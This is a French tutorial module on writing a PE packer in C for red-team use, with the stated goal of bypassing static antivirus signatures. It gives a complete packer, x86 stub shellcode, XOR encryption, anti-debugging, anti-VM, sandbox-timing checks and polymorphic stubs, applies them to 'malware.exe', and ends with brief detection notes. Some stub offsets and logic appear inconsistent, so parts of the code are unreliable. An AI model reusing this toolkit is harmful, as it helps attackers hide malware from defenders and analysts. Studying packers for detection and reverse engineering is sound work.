# Module W44 : PE Packer Development

## Objectifs du Module

À la fin de ce module, vous serez capable de :

- Comprendre l'architecture et le fonctionnement d'un packer PE
- Implémenter un packer basique en C
- Utiliser des algorithmes de compression (LZNT1, aPLib)
- Créer un stub loader personnalisé
- Contourner les signatures antivirales statiques
- Identifier et analyser des binaires packés
- Comprendre les techniques de détection et d'unpacking

---

## 1. Qu'est-ce qu'un PE Packer ?

### 1.1 Définition

Un **packer** (ou compresseur d'exécutable) est un outil qui transforme un fichier PE (Portable Executable) pour :

1. **Compresser** le code et les données (réduction de taille)
2. **Chiffrer** le payload (obfuscation)
3. **Modifier les signatures** (évasion antivirus)
4. **Protéger contre l'analyse** (anti-reverse engineering)

### 1.2 Analogie : Le Cadeau Emballé

Imaginez un packer comme un emballage cadeau :

```
┌─────────────────────────────────────┐
│  CADEAU ORIGINAL (PE non packé)     │
│  ┌──────────────┐                   │
│  │ Jouet visible│ ← On voit ce que  │
│  │ et reconnu   │   c'est           │
│  └──────────────┘                   │
└─────────────────────────────────────┘

┌─────────────────────────────────────┐
│  CADEAU EMBALLÉ (PE packé)          │
│  ┌────────────────────────────┐     │
│  │ Papier cadeau opaque       │     │
│  │ + Instructions pour ouvrir │     │
│  │   ┌──────────┐             │     │
│  │   │ Jouet    │             │     │
│  │   │ caché    │             │     │
│  │   └──────────┘             │     │
│  └────────────────────────────┘     │
└─────────────────────────────────────┘
```

Le packer :
- **Emballe** le code original (compression/chiffrement)
- **Ajoute des instructions** pour le déballer (stub loader)
- **Cache** le contenu réel (évasion des signatures)

### 1.3 Workflow d'un Packer

```ascii
┌──────────────────────────────────────────────────────────────┐
│                   PROCESSUS DE PACKING                       │
└──────────────────────────────────────────────────────────────┘

 [1] PE ORIGINAL              [2] COMPRESSION         [3] CHIFFREMENT
┌──────────────┐             ┌──────────────┐        ┌──────────────┐
│ .text        │             │ Compressed   │        │ Encrypted    │
│ .data        │  ─────────► │ .text        │ ─────► │ Payload      │
│ .rsrc        │             │ .data        │        │              │
│ Import Table │             │ .rsrc        │        │              │
└──────────────┘             └──────────────┘        └──────────────┘

                                      │
                                      │
                                      ▼

┌──────────────────────────────────────────────────────────────┐
│                    [4] PE PACKÉ FINAL                        │
├──────────────────────────────────────────────────────────────┤
│  ┌────────────────────────────────────────────────┐          │
│  │ STUB LOADER (nouveau .text)                    │          │
│  │ - Décompression                                │          │
│  │ - Déchiffrement                                │          │
│  │ - Allocation mémoire                           │          │
│  │ - Résolution des imports                       │          │
│  │ - Transfert d'exécution                        │          │
│  └────────────────────────────────────────────────┘          │
│  ┌────────────────────────────────────────────────┐          │
│  │ PAYLOAD CHIFFRÉ (nouvelle section .packed)     │          │
│  │ - Code original compressé/chiffré              │          │
│  │ - Import Table compressée                      │          │
│  │ - Ressources compressées                       │          │
│  └────────────────────────────────────────────────┘          │
└──────────────────────────────────────────────────────────────┘
```

### 1.4 Pourquoi Utiliser un Packer en Red Team ?

**Avantages Offensifs :**

1. **Évasion AV/EDR** : Les signatures antivirales ne détectent plus le payload
2. **Réduction d'empreinte** : Fichier plus petit, moins de métadonnées
3. **Anti-analyse** : Complique le reverse engineering
4. **Polymorphisme** : Chaque build génère un hash différent
5. **Protection de propriété intellectuelle** : Code source non décompilable

**Inconvénients :**

1. **Suspicion** : Les AVs détectent souvent les packers eux-mêmes
2. **Heuristique** : Comportement de décompression en mémoire suspect
3. **Performance** : Overhead au démarrage (décompression)
4. **Complexité** : Bugs potentiels dans le stub loader

---

## 2. Architecture d'un Packer

### 2.1 Composants Principaux

```ascii
┌─────────────────────────────────────────────────────────────┐
│                 ARCHITECTURE D'UN PACKER                    │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ [A] COMPRESSOR ENGINE                                       │
│ ┌─────────────┐  ┌─────────────┐  ┌─────────────┐          │
│ │  LZNT1      │  │   aPLib     │  │    LZMA     │          │
│ │ (Windows)   │  │ (efficace)  │  │ (puissant)  │          │
│ └─────────────┘  └─────────────┘  └─────────────┘          │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ [B] ENCRYPTION ENGINE                                       │
│ ┌─────────────┐  ┌─────────────┐  ┌─────────────┐          │
│ │     XOR     │  │    RC4      │  │    AES      │          │
│ │  (simple)   │  │  (rapide)   │  │  (secure)   │          │
│ └─────────────┘  └─────────────┘  └─────────────┘          │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ [C] STUB LOADER (Code injecté dans le PE packé)            │
│                                                             │
│  1. [Entry Point] ─────────────────────┐                   │
│                                         │                   │
│  2. [Déchiffrement du Payload]         │                   │
│       ├─ Clé XOR/RC4                   │                   │
│       └─ Déchiffrement in-memory       │                   │
│                                         │                   │
│  3. [Décompression]                    │                   │
│       ├─ Allocation VirtualAlloc       │                   │
│       └─ RtlDecompressBuffer           │                   │
│                                         │                   │
│  4. [Résolution des Imports]           │                   │
│       ├─ LoadLibrary des DLLs          │                   │
│       └─ GetProcAddress des fonctions  │                   │
│                                         │                   │
│  5. [Relocation]                       │                   │
│       └─ Patch des adresses            │                   │
│                                         │                   │
│  6. [Transfert d'Exécution]            │                   │
│       └─ JMP vers OEP original         │                   │
│                                         ▼                   │
│                              [Original Entry Point]         │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ [D] PE BUILDER                                              │
│ ┌───────────────────────────────────────────────────────┐   │
│ │ - Lecture du PE original                              │   │
│ │ - Ajout d'une nouvelle section .packed                │   │
│ │ - Modification de l'Entry Point                       │   │
│ │ - Réécriture des headers PE                           │   │
│ │ - Sauvegarde du nouveau fichier                       │   │
│ └───────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────┘
```

### 2.2 Loader Stub : Le Cœur du Packer

Le **stub loader** est le code qui s'exécute en premier lors du lancement du PE packé.

```c
// Pseudo-code du stub loader
void __stdcall StubEntry() {
    // [1] Récupération de l'adresse de base
    PVOID imageBase = GetImageBase();

    // [2] Localisation du payload chiffré
    BYTE* encryptedPayload = (BYTE*)imageBase + PAYLOAD_OFFSET;
    DWORD payloadSize = PAYLOAD_SIZE;

    // [3] Déchiffrement XOR
    for (DWORD i = 0; i < payloadSize; i++) {
        encryptedPayload[i] ^= XOR_KEY;
    }

    // [4] Décompression
    PVOID decompressedBuffer = VirtualAlloc(
        NULL,
        ORIGINAL_SIZE,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    RtlDecompressBuffer(
        COMPRESSION_FORMAT_LZNT1,
        decompressedBuffer,
        ORIGINAL_SIZE,
        encryptedPayload,
        payloadSize,
        &finalSize
    );

    // [5] Résolution des imports
    ResolveImports(decompressedBuffer);

    // [6] Relocation
    ApplyRelocations(decompressedBuffer, imageBase);

    // [7] Saut vers l'OEP original
    DWORD originalEntryPoint = OEP_OFFSET;
    ((void(*)())((BYTE*)decompressedBuffer + originalEntryPoint))();
}
```

### 2.3 Flux d'Exécution

```ascii
┌────────────────────────────────────────────────────────────┐
│          EXÉCUTION D'UN PE PACKÉ (RUNTIME)                 │
└────────────────────────────────────────────────────────────┘

 Temps ──────────────────────────────────────────────────►

  [T0] Lancement du PE     [T1] Stub Entry      [T2] Décompression
       packé                    Point
    ┌──────┐               ┌──────────┐         ┌──────────────┐
    │ User │               │   Stub   │         │ VirtualAlloc │
    │ Exec │  ─────────►   │  Loader  │  ─────► │ + Decrypt    │
    └──────┘               └──────────┘         └──────────────┘
                                 │                      │
                                 │                      │
                                 ▼                      ▼

  [T3] Import Resolution  [T4] Relocation      [T5] OEP Jump
    ┌──────────────┐       ┌──────────────┐    ┌──────────────┐
    │ LoadLibrary  │       │ Patch        │    │ JMP to       │
    │ GetProcAddr  │ ────► │ Addresses    │ ─► │ Original EP  │
    └──────────────┘       └──────────────┘    └──────────────┘
                                                       │
                                                       │
                                                       ▼
                                            ┌──────────────────┐
                                            │  ORIGINAL CODE   │
                                            │  EXECUTION       │
                                            └──────────────────┘
```

---

## 3. Implémentation d'un Packer Minimaliste

### 3.1 Lecture du PE Original

```c
#include <windows.h>
#include <stdio.h>

// Structure pour stocker les infos du PE
typedef struct {
    BYTE* fileData;
    DWORD fileSize;
    PIMAGE_DOS_HEADER dosHeader;
    PIMAGE_NT_HEADERS ntHeaders;
    PIMAGE_SECTION_HEADER sectionHeaders;
} PE_INFO;

BOOL LoadPEFile(const char* filename, PE_INFO* peInfo) {
    // Ouverture du fichier
    HANDLE hFile = CreateFileA(
        filename,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Erreur ouverture fichier\n");
        return FALSE;
    }

    // Récupération de la taille
    peInfo->fileSize = GetFileSize(hFile, NULL);

    // Allocation mémoire
    peInfo->fileData = (BYTE*)malloc(peInfo->fileSize);
    if (!peInfo->fileData) {
        CloseHandle(hFile);
        return FALSE;
    }

    // Lecture du fichier
    DWORD bytesRead;
    if (!ReadFile(hFile, peInfo->fileData, peInfo->fileSize, &bytesRead, NULL)) {
        free(peInfo->fileData);
        CloseHandle(hFile);
        return FALSE;
    }

    CloseHandle(hFile);

    // Parsing des headers PE
    peInfo->dosHeader = (PIMAGE_DOS_HEADER)peInfo->fileData;

    // Vérification signature DOS
    if (peInfo->dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[-] Signature DOS invalide\n");
        free(peInfo->fileData);
        return FALSE;
    }

    // Récupération du header NT
    peInfo->ntHeaders = (PIMAGE_NT_HEADERS)(peInfo->fileData + peInfo->dosHeader->e_lfanew);

    // Vérification signature PE
    if (peInfo->ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        printf("[-] Signature PE invalide\n");
        free(peInfo->fileData);
        return FALSE;
    }

    // Récupération des sections
    peInfo->sectionHeaders = IMAGE_FIRST_SECTION(peInfo->ntHeaders);

    printf("[+] PE chargé : %d bytes\n", peInfo->fileSize);
    printf("[+] Entry Point : 0x%08X\n", peInfo->ntHeaders->OptionalHeader.AddressOfEntryPoint);
    printf("[+] Sections : %d\n", peInfo->ntHeaders->FileHeader.NumberOfSections);

    return TRUE;
}
```

### 3.2 Compression avec LZNT1

```c
#include <ntdef.h>

// Prototype de la fonction native Windows
typedef NTSTATUS (WINAPI *RtlCompressBuffer_t)(
    USHORT CompressionFormat,
    PUCHAR UncompressedBuffer,
    ULONG UncompressedBufferSize,
    PUCHAR CompressedBuffer,
    ULONG CompressedBufferSize,
    ULONG UncompressedChunkSize,
    PULONG FinalCompressedSize,
    PVOID WorkSpace
);

#define COMPRESSION_FORMAT_LZNT1 2
#define COMPRESSION_ENGINE_MAXIMUM 0x100

BOOL CompressPayload(BYTE* input, DWORD inputSize, BYTE** output, DWORD* outputSize) {
    // Chargement de ntdll.dll
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    if (!hNtdll) {
        printf("[-] Erreur chargement ntdll.dll\n");
        return FALSE;
    }

    // Récupération de RtlCompressBuffer
    RtlCompressBuffer_t RtlCompressBuffer = (RtlCompressBuffer_t)GetProcAddress(
        hNtdll,
        "RtlCompressBuffer"
    );

    if (!RtlCompressBuffer) {
        printf("[-] RtlCompressBuffer non trouvée\n");
        FreeLibrary(hNtdll);
        return FALSE;
    }

    // Allocation du buffer de sortie (taille max = input + overhead)
    DWORD maxCompressedSize = inputSize + (inputSize / 8) + 256;
    *output = (BYTE*)malloc(maxCompressedSize);
    if (!*output) {
        FreeLibrary(hNtdll);
        return FALSE;
    }

    // Allocation du workspace pour l'algorithme
    DWORD workSpaceSize = 0x100000; // 1MB
    PVOID workSpace = malloc(workSpaceSize);
    if (!workSpace) {
        free(*output);
        FreeLibrary(hNtdll);
        return FALSE;
    }

    // Compression
    ULONG finalSize;
    NTSTATUS status = RtlCompressBuffer(
        COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_MAXIMUM,
        input,
        inputSize,
        *output,
        maxCompressedSize,
        4096, // Chunk size
        &finalSize,
        workSpace
    );

    free(workSpace);
    FreeLibrary(hNtdll);

    if (status != 0) {
        printf("[-] Erreur compression : 0x%08X\n", status);
        free(*output);
        return FALSE;
    }

    *outputSize = finalSize;
    printf("[+] Compression : %d -> %d bytes (%.2f%%)\n",
           inputSize,
           finalSize,
           (float)finalSize / inputSize * 100);

    return TRUE;
}
```

### 3.3 Chiffrement XOR Simple

```c
void XOREncrypt(BYTE* data, DWORD size, BYTE key) {
    for (DWORD i = 0; i < size; i++) {
        data[i] ^= key;
    }
}

// Amélioration : XOR avec clé multi-bytes
void XOREncryptMultiByte(BYTE* data, DWORD size, BYTE* key, DWORD keySize) {
    for (DWORD i = 0; i < size; i++) {
        data[i] ^= key[i % keySize];
    }
}

// Exemple d'utilisation
BYTE xorKey[] = { 0xDE, 0xAD, 0xBE, 0xEF };
XOREncryptMultiByte(compressedData, compressedSize, xorKey, sizeof(xorKey));
```

### 3.4 Génération du Stub Loader

```c
// Template du stub (shellcode position-independent)
unsigned char stubTemplate[] = {
    // Prologue
    0x55,                           // push ebp
    0x89, 0xE5,                     // mov ebp, esp
    0x60,                           // pusha

    // Récupération de l'image base via PEB
    0x64, 0xA1, 0x30, 0x00, 0x00, 0x00,  // mov eax, fs:[0x30]  (PEB)
    0x8B, 0x40, 0x08,                    // mov eax, [eax+8]    (ImageBase)
    0x89, 0xC3,                          // mov ebx, eax        (save ImageBase)

    // Déchiffrement XOR
    // mov esi, [imageBase + PAYLOAD_OFFSET]
    0x8B, 0xB3, 0x00, 0x10, 0x00, 0x00,  // Offset à patcher
    // mov ecx, PAYLOAD_SIZE
    0xB9, 0x00, 0x00, 0x00, 0x00,        // Size à patcher
    // xor_loop:
    0x80, 0x36, 0xDE,                    // xor byte [esi], 0xDE  (key à patcher)
    0x46,                                // inc esi
    0xE2, 0xFA,                          // loop xor_loop

    // Décompression (appel à RtlDecompressBuffer)
    // ... code pour charger ntdll et appeler la fonction ...

    // Jump vers OEP
    0x61,                           // popa
    0x89, 0xEC,                     // mov esp, ebp
    0x5D,                           // pop ebp
    0xFF, 0x25, 0x00, 0x00, 0x00, 0x00  // jmp [OEP address]
};

// Fonction pour patcher le stub avec les valeurs réelles
void PatchStub(BYTE* stub, DWORD payloadOffset, DWORD payloadSize, BYTE xorKey, DWORD oep) {
    // Patch de PAYLOAD_OFFSET (offset 15-18)
    *(DWORD*)(stub + 15) = payloadOffset;

    // Patch de PAYLOAD_SIZE (offset 20-23)
    *(DWORD*)(stub + 20) = payloadSize;

    // Patch de XOR_KEY (offset 25)
    stub[25] = xorKey;

    // Patch de OEP (offset final)
    *(DWORD*)(stub + sizeof(stubTemplate) - 4) = oep;
}
```

### 3.5 Reconstruction du PE

```c
BOOL BuildPackedPE(PE_INFO* originalPE, BYTE* compressedPayload, DWORD compressedSize,
                   const char* outputFile) {
    // Calcul de la taille du nouveau PE
    DWORD newSectionSize = ALIGN(compressedSize + sizeof(stubTemplate), 0x1000);
    DWORD newFileSize = originalPE->fileSize + newSectionSize;

    // Allocation du buffer pour le nouveau PE
    BYTE* packedPE = (BYTE*)calloc(1, newFileSize);
    if (!packedPE) return FALSE;

    // Copie du PE original
    memcpy(packedPE, originalPE->fileData, originalPE->fileSize);

    // Récupération des headers
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)packedPE;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(packedPE + dosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(ntHeaders);

    // Sauvegarde de l'OEP original
    DWORD originalOEP = ntHeaders->OptionalHeader.AddressOfEntryPoint;

    // Ajout d'une nouvelle section .packed
    WORD numSections = ntHeaders->FileHeader.NumberOfSections;
    PIMAGE_SECTION_HEADER newSection = &sections[numSections];

    memcpy(newSection->Name, ".packed\0", 8);
    newSection->Misc.VirtualSize = newSectionSize;
    newSection->VirtualAddress = ALIGN(
        sections[numSections - 1].VirtualAddress + sections[numSections - 1].Misc.VirtualSize,
        0x1000
    );
    newSection->SizeOfRawData = newSectionSize;
    newSection->PointerToRawData = originalPE->fileSize;
    newSection->Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_CODE;

    // Incrémentation du nombre de sections
    ntHeaders->FileHeader.NumberOfSections++;

    // Mise à jour de SizeOfImage
    ntHeaders->OptionalHeader.SizeOfImage = ALIGN(
        newSection->VirtualAddress + newSection->Misc.VirtualSize,
        0x1000
    );

    // Modification de l'Entry Point vers le stub
    ntHeaders->OptionalHeader.AddressOfEntryPoint = newSection->VirtualAddress;

    // Patch du stub
    BYTE* stubCode = (BYTE*)malloc(sizeof(stubTemplate));
    memcpy(stubCode, stubTemplate, sizeof(stubTemplate));

    PatchStub(
        stubCode,
        newSection->VirtualAddress + sizeof(stubTemplate), // Payload après stub
        compressedSize,
        0xDE, // XOR key
        originalOEP
    );

    // Copie du stub et du payload dans la nouvelle section
    BYTE* newSectionData = packedPE + newSection->PointerToRawData;
    memcpy(newSectionData, stubCode, sizeof(stubTemplate));
    memcpy(newSectionData + sizeof(stubTemplate), compressedPayload, compressedSize);

    free(stubCode);

    // Écriture du fichier packed
    HANDLE hFile = CreateFileA(
        outputFile,
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        free(packedPE);
        return FALSE;
    }

    DWORD bytesWritten;
    WriteFile(hFile, packedPE, newFileSize, &bytesWritten, NULL);
    CloseHandle(hFile);

    free(packedPE);

    printf("[+] PE packé créé : %s (%d bytes)\n", outputFile, newFileSize);
    return TRUE;
}

// Macro d'alignement
#define ALIGN(size, alignment) (((size) + (alignment) - 1) & ~((alignment) - 1))
```

---

## 4. Code C Complet : Packer Basique

### 4.1 SimplePacker.c

```c
#include <windows.h>
#include <stdio.h>

#define COMPRESSION_FORMAT_LZNT1 2
#define COMPRESSION_ENGINE_MAXIMUM 0x100

typedef struct {
    BYTE* fileData;
    DWORD fileSize;
    PIMAGE_DOS_HEADER dosHeader;
    PIMAGE_NT_HEADERS ntHeaders;
    PIMAGE_SECTION_HEADER sectionHeaders;
} PE_INFO;

typedef NTSTATUS (WINAPI *RtlCompressBuffer_t)(
    USHORT, PUCHAR, ULONG, PUCHAR, ULONG, ULONG, PULONG, PVOID
);

// Stub loader (x86)
unsigned char g_stubLoader[] = {
    0x60,                                   // pushad
    0xE8, 0x00, 0x00, 0x00, 0x00,          // call $+5
    0x5B,                                   // pop ebx (ebx = current EIP)
    0x83, 0xEB, 0x05,                      // sub ebx, 5

    // XOR decrypt loop
    0x8D, 0xB3, 0x50, 0x00, 0x00, 0x00,    // lea esi, [ebx + 0x50] (payload offset)
    0xB9, 0x00, 0x00, 0x00, 0x00,          // mov ecx, 0 (size - patched)
    // decrypt_loop:
    0x80, 0x36, 0xAA,                       // xor byte [esi], 0xAA (key - patched)
    0x46,                                   // inc esi
    0xE2, 0xFA,                             // loop decrypt_loop

    // Restore and jump to OEP
    0x61,                                   // popad
    0xB8, 0x00, 0x00, 0x00, 0x00,          // mov eax, 0 (OEP - patched)
    0xFF, 0xE0                              // jmp eax
};

BOOL LoadPE(const char* filename, PE_INFO* pe) {
    HANDLE hFile = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    pe->fileSize = GetFileSize(hFile, NULL);
    pe->fileData = (BYTE*)malloc(pe->fileSize);

    DWORD read;
    ReadFile(hFile, pe->fileData, pe->fileSize, &read, NULL);
    CloseHandle(hFile);

    pe->dosHeader = (PIMAGE_DOS_HEADER)pe->fileData;
    if (pe->dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        free(pe->fileData);
        return FALSE;
    }

    pe->ntHeaders = (PIMAGE_NT_HEADERS)(pe->fileData + pe->dosHeader->e_lfanew);
    if (pe->ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        free(pe->fileData);
        return FALSE;
    }

    pe->sectionHeaders = IMAGE_FIRST_SECTION(pe->ntHeaders);
    return TRUE;
}

BOOL CompressPE(BYTE* input, DWORD inputSize, BYTE** output, DWORD* outputSize) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    RtlCompressBuffer_t RtlCompressBuffer = (RtlCompressBuffer_t)
        GetProcAddress(hNtdll, "RtlCompressBuffer");

    if (!RtlCompressBuffer) return FALSE;

    DWORD maxSize = inputSize * 2;
    *output = (BYTE*)malloc(maxSize);

    PVOID workspace = malloc(0x100000);
    ULONG finalSize;

    NTSTATUS status = RtlCompressBuffer(
        COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_MAXIMUM,
        input, inputSize, *output, maxSize, 4096, &finalSize, workspace
    );

    free(workspace);

    if (status != 0) {
        free(*output);
        return FALSE;
    }

    *outputSize = finalSize;
    return TRUE;
}

void XORCrypt(BYTE* data, DWORD size, BYTE key) {
    for (DWORD i = 0; i < size; i++) {
        data[i] ^= key;
    }
}

BOOL PackPE(const char* inputFile, const char* outputFile) {
    PE_INFO pe = {0};

    printf("[*] Chargement de %s...\n", inputFile);
    if (!LoadPE(inputFile, &pe)) {
        printf("[-] Erreur chargement PE\n");
        return FALSE;
    }

    printf("[+] PE chargé : %d bytes, %d sections\n",
           pe.fileSize, pe.ntHeaders->FileHeader.NumberOfSections);

    // Extraction du .text section
    PIMAGE_SECTION_HEADER textSection = NULL;
    for (int i = 0; i < pe.ntHeaders->FileHeader.NumberOfSections; i++) {
        if (memcmp(pe.sectionHeaders[i].Name, ".text", 5) == 0) {
            textSection = &pe.sectionHeaders[i];
            break;
        }
    }

    if (!textSection) {
        printf("[-] Section .text non trouvée\n");
        free(pe.fileData);
        return FALSE;
    }

    BYTE* textData = pe.fileData + textSection->PointerToRawData;
    DWORD textSize = textSection->SizeOfRawData;

    printf("[*] Compression de .text (%d bytes)...\n", textSize);

    BYTE* compressed;
    DWORD compressedSize;
    if (!CompressPE(textData, textSize, &compressed, &compressedSize)) {
        printf("[-] Erreur compression\n");
        free(pe.fileData);
        return FALSE;
    }

    printf("[+] Compressé : %d -> %d bytes (%.1f%%)\n",
           textSize, compressedSize, (float)compressedSize / textSize * 100);

    // Chiffrement XOR
    BYTE xorKey = 0xAA;
    XORCrypt(compressed, compressedSize, xorKey);
    printf("[+] Chiffré avec clé 0x%02X\n", xorKey);

    // Création du PE packé
    DWORD stubSize = sizeof(g_stubLoader);
    DWORD packedSize = stubSize + compressedSize;

    // Patch du stub
    *(DWORD*)(g_stubLoader + 18) = compressedSize;  // Taille
    g_stubLoader[23] = xorKey;                       // Clé XOR
    *(DWORD*)(g_stubLoader + 30) = pe.ntHeaders->OptionalHeader.AddressOfEntryPoint; // OEP

    // Écriture du fichier packed (simplifié - juste le stub + payload)
    HANDLE hOut = CreateFileA(outputFile, GENERIC_WRITE, 0, NULL,
                             CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOut == INVALID_HANDLE_VALUE) {
        free(compressed);
        free(pe.fileData);
        return FALSE;
    }

    DWORD written;
    WriteFile(hOut, g_stubLoader, stubSize, &written, NULL);
    WriteFile(hOut, compressed, compressedSize, &written, NULL);
    CloseHandle(hOut);

    printf("[+] PE packé créé : %s\n", outputFile);

    free(compressed);
    free(pe.fileData);
    return TRUE;
}

int main(int argc, char* argv[]) {
    printf("═══════════════════════════════════════\n");
    printf("  SimplePacker - Basic PE Packer\n");
    printf("═══════════════════════════════════════\n\n");

    if (argc != 3) {
        printf("Usage: %s <input.exe> <output.exe>\n", argv[0]);
        return 1;
    }

    if (PackPE(argv[1], argv[2])) {
        printf("\n[+] Packing réussi !\n");
        return 0;
    } else {
        printf("\n[-] Échec du packing\n");
        return 1;
    }
}
```

### 4.2 Compilation

```bash
# Avec GCC (MinGW)
gcc -o SimplePacker.exe SimplePacker.c -lntdll

# Avec MSVC
cl.exe SimplePacker.c /link ntdll.lib
```

### 4.3 Utilisation

```bash
# Packer un exécutable
SimplePacker.exe malware.exe malware_packed.exe

# Vérification
dir malware.exe malware_packed.exe
```

---

## 5. Techniques Anti-Analyse Avancées

### 5.1 Anti-Debugging

```c
// Détection de debugger via IsDebuggerPresent
BOOL IsDebugged() {
    if (IsDebuggerPresent()) {
        return TRUE;
    }

    // Vérification via PEB
    BOOL isDebug = FALSE;
    __asm {
        mov eax, fs:[0x30]      // PEB
        mov al, [eax + 2]       // BeingDebugged
        mov isDebug, al
    }

    return isDebug;
}

// Intégration dans le stub
void StubEntry() {
    if (IsDebugged()) {
        ExitProcess(0);  // Terminer si debugger détecté
    }

    // Continuer le déchiffrement...
}
```

### 5.2 Anti-VM

```c
// Détection de machine virtuelle
BOOL IsVM() {
    // Vérification CPUID (VMware/VirtualBox)
    int cpuInfo[4];
    __cpuid(cpuInfo, 1);

    if ((cpuInfo[2] >> 31) & 1) {  // Hypervisor bit
        return TRUE;
    }

    // Vérification registre (VMware Tools)
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                      "SOFTWARE\\VMware, Inc.\\VMware Tools",
                      0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return TRUE;
    }

    return FALSE;
}
```

### 5.3 Code Obfuscation dans le Stub

```c
// Insertion de junk code
void ObfuscatedStub() {
    __asm {
        // Junk instructions
        nop
        nop
        push eax
        pop eax
        xor eax, eax
        add eax, 0

        // Code réel
        call RealDecryptionFunction

        // Plus de junk
        test eax, eax
        jz fake_label
        jmp real_label
    fake_label:
        nop
    real_label:
        // Continue...
    }
}
```

### 5.4 Polymorphic Stub

```c
// Génération d'un stub différent à chaque build
void GeneratePolymorphicStub(BYTE* output) {
    BYTE templates[3][10] = {
        // Template 1 : XOR standard
        { 0x80, 0x36, 0xAA, 0x46, 0xE2, 0xFA },

        // Template 2 : ADD puis SUB
        { 0x80, 0x06, 0x55, 0x80, 0x2E, 0x55, 0x46, 0xE2, 0xF6 },

        // Template 3 : ROL
        { 0xC0, 0x06, 0x03, 0x46, 0xE2, 0xFB }
    };

    // Sélection aléatoire
    srand(time(NULL));
    int choice = rand() % 3;

    memcpy(output, templates[choice], 10);
}
```

### 5.5 Timing Attacks

```c
// Détection d'analyse par mesure de temps
BOOL IsAnalyzed() {
    DWORD start = GetTickCount();

    Sleep(1000);  // Attente normale

    DWORD elapsed = GetTickCount() - start;

    // Si le temps est anormalement long, probablement en sandbox
    if (elapsed > 1500) {
        return TRUE;
    }

    return FALSE;
}
```

---

## 6. Packers Connus et Analyse

### 6.1 UPX (Ultimate Packer for eXecutables)

```ascii
┌────────────────────────────────────────────────────────┐
│                    UPX STRUCTURE                       │
└────────────────────────────────────────────────────────┘

 PE HEADER
┌─────────────────┐
│ DOS Header      │
│ PE Header       │
│ Section Table   │  ← 3 sections : UPX0, UPX1, .rsrc
└─────────────────┘

 SECTIONS
┌─────────────────┐
│ UPX0            │  ← Données décompressées (vide au départ)
│ (RWX)           │
├─────────────────┤
│ UPX1            │  ← Code compressé + Décompresseur
│ (RWX)           │     Entry Point pointe ici
├─────────────────┤
│ .rsrc           │  ← Ressources (non compressées)
│ (R)             │
└─────────────────┘

 DÉCOMPRESSION RUNTIME
┌─────────────────────────────────────────────────────────┐
│ 1. EP (UPX1) → Décompresseur s'exécute                 │
│ 2. Décompression de UPX1 → UPX0                        │
│ 3. JMP vers OEP dans UPX0                               │
│ 4. Code original s'exécute                              │
└─────────────────────────────────────────────────────────┘
```

**Utilisation :**
```bash
# Packer
upx.exe -9 --ultra-brute malware.exe -o malware_packed.exe

# Unpacker
upx.exe -d malware_packed.exe -o malware_unpacked.exe
```

**Caractéristiques :**
- Open-source, facilement détectable
- Compression LZMA très efficace
- Facilement unpackable (signature connue)

### 6.2 Themida

**Techniques utilisées :**
- Virtualisation de code (VM custom)
- Anti-debugging multiple
- Encryption multicouche
- Code mutation

```
THEMIDA PROTECTION LAYERS:

┌───────────────────────────────────────┐
│ Layer 1: Anti-Debug/VM Checks         │
├───────────────────────────────────────┤
│ Layer 2: Code Virtualization          │
│   ┌───────────────────────────────┐   │
│   │ Custom VM Interpreter         │   │
│   │ - Bytecode obfuscated         │   │
│   │ - JIT decompilation           │   │
│   └───────────────────────────────┘   │
├───────────────────────────────────────┤
│ Layer 3: Encrypted Payload            │
├───────────────────────────────────────┤
│ Layer 4: Import Hiding                │
└───────────────────────────────────────┘
```

### 6.3 VMProtect

- Convertit le code x86 en bytecode custom
- Interpréteur VM intégré
- Quasi impossible à unpacker sans reverse complet

### 6.4 Comparatif

| Packer      | Détection | Unpacking | Performance | Usage Red Team |
|-------------|-----------|-----------|-------------|----------------|
| UPX         | Facile    | Facile    | Excellente  | Faible         |
| Themida     | Moyen     | Difficile | Moyenne     | Moyen          |
| VMProtect   | Difficile | Très diff | Mauvaise    | Élevé          |
| Custom      | Difficile | Variable  | Variable    | **Optimal**    |

---

## 7. Détection et Unpacking

### 7.1 Signes d'un PE Packé

```bash
# Indicateurs statiques
1. Entry Point dans une section non-standard (.packed, UPX1, etc.)
2. Sections avec RWX (Read-Write-Execute)
3. Haute entropie (données compressées/chiffrées)
4. Import Table minimale ou obfusquée
5. Anomalies dans les headers PE

# Vérification avec PEiD
peid.exe suspect.exe
```

### 7.2 Analyse d'Entropie

```python
import math
from collections import Counter

def calculate_entropy(data):
    if not data:
        return 0

    entropy = 0
    counter = Counter(data)

    for count in counter.values():
        p_x = count / len(data)
        entropy += - p_x * math.log2(p_x)

    return entropy

